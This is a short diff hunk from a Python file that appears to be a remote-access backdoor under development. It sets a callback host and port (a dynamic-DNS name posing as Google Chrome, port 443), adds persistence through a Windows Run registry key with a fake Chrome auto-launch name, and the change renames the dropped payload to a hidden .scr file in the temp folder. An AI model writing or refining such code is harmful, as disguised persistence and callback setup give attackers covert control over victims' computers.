@@ -8,14 +8,14 @@ import socket
 import urllib
 
 NO_IP_HOST = 'googlechromeauto.serveirc.com'
-LHOST = '192.168.1.3'#'googlechromeauto.serveirc.com' #"54.175.188.182"
+LHOST = '192.168.1.3'
 LPORT = 443
-TIME_SLEEP = 10
+TIME_SLEEP = 5
 
 TEMP_PATH = tempfile.gettempdir()
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REG_NAME = "GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312"
-REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.exe' + '"' + ' --no-startup-window /prefetch:5'
+REG_VALUE = '"' + TEMP_PATH + '\.GoogleChromeAutoLaunch.scr' + '"' + ' --no-startup-window /prefetch:5'
 
 def set_reg_key_value(REG_PATH, name, value):
     try:
